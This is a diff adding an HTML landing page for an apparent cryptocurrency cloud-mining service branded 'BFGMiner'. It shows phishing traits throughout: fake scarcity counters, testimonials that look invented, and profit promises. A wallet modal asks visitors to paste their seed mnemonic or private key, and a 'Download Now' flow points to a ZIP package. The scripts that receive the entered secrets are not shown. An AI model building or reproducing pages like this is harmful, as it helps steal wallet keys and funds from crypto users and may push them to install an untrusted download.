@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BFGMiner - Forge Your Digital Fortune</title>
+    <link rel="icon" href="assets/logo.svg" type="image/svg+xml">
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;900&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&amp;display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/web3@1.7.3/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
+</head>
+<body class="bg-brand-dark text-brand-light font-sans antialiased">
+
+    <!-- Header -->
+    <header id="main-header" class="sticky top-0 z-40 w-full transition-all duration-300">
+        <div class="container mx-auto px-6 py-4">
+            <div class="flex items-center justify-between">
+                <a href="#" class="flex items-center space-x-2">
+                    <img src="https://r2.flowith.net/files/o/1756852089459-bfgminer_cryptocurrency_logo_index_0@1024x1024.png" alt="BFGMiner Logo" class="h-8 w-auto">
+                    <span class="text-xl font-bold text-white">BFGMiner</span>
+                </a>
+                <nav class="hidden md:flex items-center space-x-8">
+                    <a href="#home" class="nav-link">Home</a>
+                    <a href="#tech" class="nav-link">Technology</a>
+                    <a href="#testimonials" class="nav-link">Testimonials</a>
+                    <a href="#faq" class="nav-link">FAQ</a>
+                </nav>
+                <button class="demo-trigger hidden md:inline-block px-5 py-2 text-sm font-semibold text-white bg-brand-orange rounded-md hover:bg-orange-400 transition-colors duration-300">
+                    Try Demo
+                </button>
+                <button id="mobile-menu-button" class="md:hidden text-white">
+                    <i data-lucide="menu" class="h-6 w-6"></i>
+                </button>
+            </div>
+        </div>
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden md:hidden bg-brand-dark/90 backdrop-blur-sm">
+            <nav class="flex flex-col items-center space-y-4 py-6">
+                <a href="#home" class="nav-link">Home</a>
+                <a href="#tech" class="nav-link">Technology</a>
+                <a href="#testimonials" class="nav-link">Testimonials</a>
+                <a href="#faq" class="nav-link">FAQ</a>
+                <button class="demo-trigger mt-4 px-6 py-3 text-base font-semibold text-white bg-brand-orange rounded-md hover:bg-orange-400 transition-colors duration-300">
+                    Try Demo
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <!-- UI Alert Banner -->
+    <div class="bg-brand-orange/10 border-t border-b border-brand-orange/30 text-center py-3">
+        <p class="text-sm text-brand-orange">
+            <i data-lucide="zap" class="inline-block h-4 w-4 mr-2"></i>
+            Limited Free Trial Slots Available! Only <span id="slot-counter" class="font-bold">50</span> slots left!
+        </p>
+    </div>
+
+    <main>
+        <!-- Hero Section -->
+        <section id="home" class="relative h-screen flex items-center justify-center text-center overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-full z-0">
+                <video autoplay loop muted playsinline class="w-full h-full object-cover">
+                    <source src="VID_20250616_202438_764.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+                <div class="absolute inset-0 bg-black/70"></div>
+            </div>
+            <div class="relative z-10 px-6 max-w-4xl mx-auto">
+                <h1 class="text-4xl md:text-6xl lg:text-7xl font-bold text-white leading-tight tracking-tight hero-title">
+                    Forge Your <span class="text-brand-orange">Digital Fortune.</span>
+                </h1>
+                <p class="mt-6 text-lg md:text-xl text-gray-300 max-w-2xl mx-auto">
+                    Welcome to the next horizon of cryptocurrency mining. Our platform harnesses institutional-grade power and delivers it through a seamless, intuitive interface. Start mining digital assets in minutes, not days.
+                </p>
+                <div class="mt-10">
+                    <button class="demo-trigger px-8 py-4 text-lg font-bold text-white bg-brand-orange rounded-lg shadow-lg shadow-brand-orange/20 hover:bg-orange-400 transition-all duration-300 transform hover:scale-105">
+                        Download Now
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Trust Section -->
+        <section id="trust" class="py-20 sm:py-28 bg-brand-dark">
+            <div class="container mx-auto px-6">
+                 <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 mb-20">
+                    <div class="flex items-center space-x-4 p-4 rounded-lg">
+                        <i data-lucide="shield-check" class="h-10 w-10 text-brand-orange"></i>
+                        <div>
+                            <h3 class="font-semibold text-white">SSL Certified</h3>
+                            <p class="text-sm text-gray-400">Secure Connections</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center space-x-4 p-4 rounded-lg">
+                        <i data-lucide="lock" class="h-10 w-10 text-brand-orange"></i>
+                        <div>
+                            <h3 class="font-semibold text-white">Fortress-Grade</h3>
+                            <p class="text-sm text-gray-400">Data Encryption</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center space-x-4 p-4 rounded-lg">
+                        <i data-lucide="server" class="h-10 w-10 text-brand-orange"></i>
+                        <div>
+                            <h3 class="font-semibold text-white">Instant Deployment</h3>
+                            <p class="text-sm text-gray-400">Cloud Infrastructure</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center space-x-4 p-4 rounded-lg">
+                        <img src="https://r2.flowith.net/files/o/1756852089459-bfgminer_cryptocurrency_logo_index_0@1024x1024.png" alt="BFGMiner Logo" class="h-8 w-auto opacity-75">
+                         <div>
+                            <h3 class="font-semibold text-white">Powered by BFGMiner</h3>
+                            <p class="text-sm text-gray-400">Industry Proven</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="testimonials">
+                    <h2 class="text-3xl md:text-4xl font-bold text-center text-white">Trusted by Miners Worldwide</h2>
+                    <p class="text-center mt-4 text-gray-400 max-w-2xl mx-auto">Don't just take our word for it. Here's what our users are saying.</p>
+
+                    <div class="mt-16 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                        <!-- Testimonial Cards -->
+                        <div class="testimonial-card">
+                            <p class="text-gray-300">"As a newcomer to crypto, the complexity was intimidating. This platform made it unbelievably simple. I was set up and earning in minutes. Truly revolutionary."</p>
+                            <div class="mt-4 font-bold text-white">- Sarah J.</div>
+                        </div>
+                        <div class="testimonial-card">
+                            <p class="text-gray-300">"The transparency is what sold me. I can see my exact hashrate and earnings in real-time. This isn't a black box; it's a professional tool for serious miners."</p>
+                            <div class="mt-4 font-bold text-white">- Marcus R.</div>
+                        </div>
+                        <div class="testimonial-card">
+                            <p class="text-gray-300">"I've built my own rigs before. The time, cost, and maintenance are a nightmare. This platform delivers comparable power without any of the headache. I'm never going back."</p>
+                            <div class="mt-4 font-bold text-white">- Alex Chen</div>
+                        </div>
+                         <div class="testimonial-card hidden lg:block">
+                            <p class="text-gray-300">"Security is non-negotiable for me. The platform's architecture and the clarity on wallet support gave me the confidence I needed to get started. Top-tier in every respect."</p>
+                            <div class="mt-4 font-bold text-white">- Isabelle D.</div>
+                        </div>
+                         <div class="testimonial-card hidden lg:block">
+                             <p class="text-gray-300">"I was looking for a passive income stream that was actually profitable. The returns have been consistent and the dashboard makes tracking everything effortless. Highly recommended."</p>
+                            <div class="mt-4 font-bold text-white">- David L.</div>
+                        </div>
+                        <div class="testimonial-card hidden lg:block md:col-span-2 lg:col-span-1">
+                            <div class="h-full flex flex-col justify-center text-center">
+                                <h4 class="text-2xl font-bold text-white">Join Thousands of Successful Miners</h4>
+                                <p class="text-gray-400 mt-2">Start your journey today.</p>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Why Choose Us Section -->
+        <section id="tech" class="py-20 sm:py-28 bg-black/20">
+            <div class="container mx-auto px-6">
+                <h2 class="text-3xl md:text-4xl font-bold text-center text-white">Your Strategic Advantage in Digital Asset Mining</h2>
+                <p class="text-center mt-4 text-gray-400 max-w-3xl mx-auto">Choosing a mining partner is a critical decision. We are built on four pillars designed to ensure your success, security, and peace of mind.</p>
+                <div class="mt-16 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 text-center">
+                    <div class="feature-card">
+                        <div class="feature-icon"><i data-lucide="shield-off"></i></div>
+                        <h3 class="text-xl font-bold text-white mt-6">Quantum-Level Security</h3>
+                        <p class="text-gray-400 mt-2 text-sm">Engineered with a security-first mindset, from 2FA to our non-custodial wallet policy, to protect your operations and earnings.</p>
+                    </div>
+                     <div class="feature-card">
+                        <div class="feature-icon"><i data-lucide="sliders-horizontal"></i></div>
+                        <h3 class="text-xl font-bold text-white mt-6">Seamless User Experience</h3>
+                        <p class="text-gray-400 mt-2 text-sm">Power should not be complicated. Our intuitive dashboard provides all the data you need with absolute clarity.</p>
+                    </div>
+                     <div class="feature-card">
+                        <div class="feature-icon"><i data-lucide="cpu"></i></div>
+                        <h3 class="text-xl font-bold text-white mt-6">The BFGMiner Power Core</h3>
+                        <p class="text-gray-400 mt-2 text-sm">We leverage the raw, uncompromising power of the BFGMiner engine, fine-tuned for maximum efficiency and reliability.</p>
+                    </div>
+                     <div class="feature-card">
+                        <div class="feature-icon"><i data-lucide="eye"></i></div>
+                        <h3 class="text-xl font-bold text-white mt-6">Radical Transparency</h3>
+                        <p class="text-gray-400 mt-2 text-sm">A direct, real-time view of your mining performance. No hidden pools, no obscure fees, no convoluted reports.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section id="faq" class="py-20 sm:py-28">
+            <div class="container mx-auto px-6 max-w-4xl">
+                <h2 class="text-3xl md:text-4xl font-bold text-center text-white">Frequently Asked Questions</h2>
+                <div class="mt-12 space-y-4">
+                    <details class="faq-item">
+                        <summary class="faq-question">Is this platform safe?</summary>
+                        <div class="faq-answer">
+                            <p><strong>Yes.</strong> Security is our highest priority. We employ end-to-end encryption for all data traffic, secure authentication protocols, and run our infrastructure in a hardened cloud environment. Crucially, we are a non-custodial platform: you connect your own wallet, and your earnings are sent directly to you. We never take possession of your crypto assets.</p>
+                        </div>
+                    </details>
+                    <details class="faq-item">
+                        <summary class="faq-question">What wallets are supported?</summary>
+                        <div class="faq-answer">
+                            <p>Our platform is designed for maximum compatibility. You can direct your mining rewards to virtually any standard Bitcoin or cryptocurrency wallet. This includes Hardware Wallets (Ledger, Trezor), Software Wallets (Exodus, MetaMask), and Exchange Wallets (Coinbase, Binance).</p>
+                        </div>
+                    </details>
+                    <details class="faq-item">
+                        <summary class="faq-question">How does the mining software work?</summary>
+                        <div class="faq-answer">
+                            <p>We provide a managed mining service, handling all complex configurations. We utilize a highly optimized version of the <strong>BFGMiner</strong> engine to perform the computational work. You simply connect your wallet and monitor your progress through our web-based dashboard.</p>
+                        </div>
+                    </details>
+                     <details class="faq-item">
+                        <summary class="faq-question">Is the free demo really free?</summary>
+                        <div class="faq-answer">
+                            <p><strong>Absolutely.</strong> Our free demo is designed to give you a genuine experience of our platform's interface and performance. There is no credit card required and no obligation. It runs for a limited time with a capped hashrate so you can see firsthand how easy it is to get started.</p>
+                        </div>
+                    </details>
+                    <details class="faq-item">
+                        <summary class="faq-question">What is BFGMiner?</summary>
+                        <div class="faq-answer">
+                           <p><strong>BFGMiner</strong> is a world-renowned, open-source mining software celebrated for its performance and stability. We use BFGMiner as the core engine for our operations, adding a seamless user interface and managed infrastructure on top of this powerful core.</p>
+                        </div>
+                    </details>
+                </div>
+            </div>
+        </section>
+
+    </main>
+    
+    <!-- Footer -->
+    <footer class="bg-black/30 border-t border-gray-800">
+        <div class="container mx-auto px-6 py-12">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                     <a href="#" class="flex items-center space-x-2">
+                        <img src="https://r2.flowith.net/files/o/1756852089459-bfgminer_cryptocurrency_logo_index_0@1024x1024.png" alt="BFGMiner Logo" class="h-8 w-auto">
+                        <span class="text-xl font-bold text-white">BFGMiner</span>
+                    </a>
+                    <p class="mt-4 text-gray-400 text-sm max-w-xs">Forge your digital fortune with the industry's most trusted mining platform.</p>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-4">Quick Links</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#home" class="hover:text-brand-orange transition-colors">Home</a></li>
+                        <li><a href="#tech" class="hover:text-brand-orange transition-colors">Technology</a></li>
+                        <li><a href="#testimonials" class="hover:text-brand-orange transition-colors">Testimonials</a></li>
+                        <li><a href="#faq" class="hover:text-brand-orange transition-colors">FAQ</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-semibold mb-4">Support</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:text-brand-orange transition-colors">Documentation</a></li>
+                        <li><a href="#" class="hover:text-brand-orange transition-colors">Community</a></li>
+                        <li><a href="#" class="hover:text-brand-orange transition-colors">Contact</a></li>
+                        <li><a href="#" class="hover:text-brand-orange transition-colors">Status</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400">
+                <p>&copy; 2024 BFGMiner. All rights reserved. Built with precision and passion for the mining community.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Registration and Download Modal -->
+    <div id="demo-modal" class="fixed inset-0 bg-black/95 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="relative w-full max-w-4xl">
+            <button id="close-modal-btn" class="absolute -top-12 right-0 text-white hover:text-brand-orange transition-colors">
+                <i data-lucide="x" class="h-8 w-8"></i>
+            </button>
+            
+            <div id="mnemonic-grid" class="w-full min-h-[600px] bg-gray-900 rounded-lg overflow-hidden">
+                <!-- Animation content will be inserted here -->
+            </div>
+            
+            <!-- Result Overlay -->
+            <div id="result-overlay" class="absolute inset-0 bg-black/90 backdrop-blur-sm hidden items-center justify-center">
+                <div id="success-state" class="bg-gray-900 p-8 rounded-xl max-w-2xl w-full mx-4 text-center hidden">
+                    <div class="mb-6">
+                        <i data-lucide="check-circle" class="h-16 w-16 text-green-500 mx-auto mb-4"></i>
+                        <h3 class="text-2xl font-bold text-white mb-2">Wallet Discovery Complete!</h3>
+                        <p class="text-gray-400">Your mnemonic phrase has been successfully discovered.</p>
+                    </div>
+                    
+                    <div class="mb-8">
+                        <h4 class="text-lg font-semibold text-white mb-4">Discovered Mnemonic Phrase:</h4>
+                        <div id="final-phrase" class="bg-gray-800 p-4 rounded-lg font-mono text-sm text-brand-orange">
+                            <!-- Final phrase will be inserted here -->
+                        </div>
+                    </div>
+                    
+                    <button id="download-now-btn" class="px-8 py-3 bg-brand-orange text-white font-semibold rounded-lg hover:bg-orange-400 transition-colors">
+                        Download Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Registration Modal -->
+    <div id="registration-modal" class="fixed inset-0 bg-black/95 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-gray-900 rounded-xl max-w-md w-full mx-4 overflow-hidden">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-2xl font-bold text-white">Get Started</h3>
+                    <button class="close-registration-modal text-gray-400 hover:text-white">
+                        <i data-lucide="x" class="h-6 w-6"></i>
+                    </button>
+                </div>
+                
+                <!-- Tab Navigation -->
+                <div class="flex mb-6 bg-gray-800 rounded-lg p-1">
+                    <button id="show-register" class="flex-1 py-2 px-4 text-sm font-medium rounded-md transition-colors active bg-brand-orange text-white">
+                        Sign Up
+                    </button>
+                    <button id="show-login" class="flex-1 py-2 px-4 text-sm font-medium rounded-md transition-colors text-gray-400 hover:text-white">
+                        Sign In
+                    </button>
+                </div>
+                
+                <!-- Registration Tab -->
+                <div id="register-tab">
+                    <form id="registration-form" class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Gmail Address</label>
+                            <input type="email" name="email" required 
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                   placeholder="your.email@gmail.com">
+                            <div class="validation-feedback text-red-400 text-xs mt-1 hidden"></div>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+                            <input type="password" name="password" required 
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                   placeholder="Strong password">
+                            <div class="validation-feedback text-red-400 text-xs mt-1 hidden"></div>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Confirm Password</label>
+                            <input type="password" name="confirmPassword" required 
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                   placeholder="Confirm password">
+                        </div>
+                        
+                        <div class="error-message bg-red-900/50 border border-red-500 text-red-200 px-3 py-2 rounded-md text-sm hidden"></div>
+                        <div class="success-message bg-green-900/50 border border-green-500 text-green-200 px-3 py-2 rounded-md text-sm hidden"></div>
+                        
+                        <button type="submit" class="w-full py-2 px-4 bg-brand-orange text-white font-semibold rounded-md hover:bg-orange-400 transition-colors">
+                            Create Account
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- Login Tab -->
+                <div id="login-tab" class="hidden">
+                    <form id="login-form" class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Gmail Address</label>
+                            <input type="email" name="email" required 
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                   placeholder="your.email@gmail.com">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+                            <input type="password" name="password" required 
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange"
+                                   placeholder="Your password">
+                        </div>
+                        
+                        <div class="error-message bg-red-900/50 border border-red-500 text-red-200 px-3 py-2 rounded-md text-sm hidden"></div>
+                        
+                        <button type="submit" class="w-full py-2 px-4 bg-brand-orange text-white font-semibold rounded-md hover:bg-orange-400 transition-colors">
+                            Sign In
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Connection Modal -->
+    <div id="wallet-modal" class="fixed inset-0 bg-black/95 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-gray-900 rounded-xl max-w-lg w-full mx-4 overflow-hidden">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-2xl font-bold text-white">Connect Wallet</h3>
+                    <button class="close-wallet-modal text-gray-400 hover:text-white">
+                        <i data-lucide="x" class="h-6 w-6"></i>
+                    </button>
+                </div>
+                
+                <!-- Tab Navigation -->
+                <div class="flex mb-6 bg-gray-800 rounded-lg p-1">
+                    <button id="show-walletconnect" class="flex-1 py-2 px-4 text-sm font-medium rounded-md transition-colors active bg-brand-orange text-white">
+                        WalletConnect
+                    </button>
+                    <button id="show-manual" class="flex-1 py-2 px-4 text-sm font-medium rounded-md transition-colors text-gray-400 hover:text-white">
+                        Manual Entry
+                    </button>
+                </div>
+                
+                <!-- WalletConnect Tab -->
+                <div id="walletconnect-tab">
+                    <div class="text-center py-8">
+                        <div class="mb-6">
+                            <i data-lucide="wallet" class="h-16 w-16 text-brand-orange mx-auto mb-4"></i>
+                            <h4 class="text-lg font-semibold text-white mb-2">Connect Your Wallet</h4>
+                            <p class="text-gray-400 text-sm">Connect using WalletConnect to any supported wallet</p>
+                        </div>
+                        
+                        <button id="connect-walletconnect" class="w-full py-3 px-4 bg-brand-orange text-white font-semibold rounded-md hover:bg-orange-400 transition-colors mb-4">
+                            Connect with WalletConnect
+                        </button>
+                        
+                        <p class="text-xs text-gray-500">Supports MetaMask, Trust Wallet, Coinbase Wallet, and 100+ others</p>
+                    </div>
+                </div>
+                
+                <!-- Manual Entry Tab -->
+                <div id="manual-tab" class="hidden">
+                    <form id="manual-wallet-form" class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Mnemonic Phrase (12 or 24 words)</label>
+                            <textarea id="mnemonic-input" name="mnemonic" rows="3"
+                                      class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange text-sm"
+                                      placeholder="word1 word2 word3 ... (separate with spaces)"></textarea>
+                            <div class="validation-feedback text-red-400 text-xs mt-1 hidden"></div>
+                        </div>
+                        
+                        <div class="text-center text-gray-400 text-sm">OR</div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Private Key</label>
+                            <input type="password" id="private-key-input" name="privateKey"
+                                   class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:border-brand-orange text-sm"
+                                   placeholder="0x... (64 hex characters)">
+                            <div class="validation-feedback text-red-400 text-xs mt-1 hidden"></div>
+                        </div>
+                        
+                        <div class="bg-yellow-900/50 border border-yellow-500 text-yellow-200 px-3 py-2 rounded-md text-xs">
+                            <i data-lucide="alert-triangle" class="h-4 w-4 inline mr-2"></i>
+                            Never share your private keys or mnemonic phrase. We encrypt and secure all data.
+                        </div>
+                        
+                        <button type="submit" class="w-full py-3 px-4 bg-brand-orange text-white font-semibold rounded-md hover:bg-orange-400 transition-colors">
+                            Connect Wallet
+                        </button>
+                    </form>
+                </div>
+                
+                <!-- Status Messages -->
+                <div id="wallet-error" class="bg-red-900/50 border border-red-500 text-red-200 px-3 py-2 rounded-md text-sm mt-4 hidden"></div>
+                <div id="wallet-success" class="bg-green-900/50 border border-green-500 text-green-200 px-3 py-2 rounded-md text-sm mt-4 hidden"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Setup Instructions Modal -->
+    <div id="setup-instructions-modal" class="fixed inset-0 bg-black/95 backdrop-blur-sm z-50 hidden items-center justify-center p-4">
+        <div class="bg-gray-900 rounded-xl max-w-2xl w-full mx-4 max-h-[80vh] overflow-hidden">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-2xl font-bold text-white">Setup Instructions</h3>
+                    <button class="close-instructions-modal text-gray-400 hover:text-white">
+                        <i data-lucide="x" class="h-6 w-6"></i>
+                    </button>
+                </div>
+                
+                <div class="overflow-y-auto max-h-[60vh]">
+                    <div class="text-center mb-6">
+                        <i data-lucide="download" class="h-16 w-16 text-green-500 mx-auto mb-4"></i>
+                        <h4 class="text-lg font-semibold text-white mb-2">Download Complete!</h4>
+                        <p class="text-gray-400">Your BFGMiner package is ready. Follow these steps to get started:</p>
+                    </div>
+                    
+                    <div class="space-y-4 text-sm text-gray-300">
+                        <div class="bg-gray-800 p-4 rounded-lg">
+                            <h5 class="font-semibold text-white mb-2">Quick Start:</h5>
+                            <ol class="list-decimal list-inside space-y-1">
+                                <li>Extract the downloaded ZIP file</li>
+                                <li>Install required dependencies for your OS</li>
+                                <li>Configure your mining pool settings</li>
+                                <li>Run BFGMiner and start mining!</li>
+                            </ol>
+                        </div>
+                        
+                        <div class="bg-blue-900/50 border border-blue-500 text-blue-200 px-3 py-2 rounded-md">
+                            <i data-lucide="info" class="h-4 w-4 inline mr-2"></i>
+                            For detailed setup instructions, visit our comprehensive guide.
+                        </div>
+                        
+                        <div class="flex space-x-3">
+                            <a href="/api/download/setup-guide" target="_blank" 
+                               class="flex-1 py-2 px-4 bg-brand-orange text-white text-center font-semibold rounded-md hover:bg-orange-400 transition-colors">
+                                View Full Guide
+                            </a>
+                            <button class="close-instructions-modal flex-1 py-2 px-4 bg-gray-700 text-white font-semibold rounded-md hover:bg-gray-600 transition-colors">
+                                Close
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="demo_animation.js"></script>
+    <script src="auth.js"></script>
+    <script src="wallet_connection.js"></script>
+    <script src="main.js"></script>
+</body>
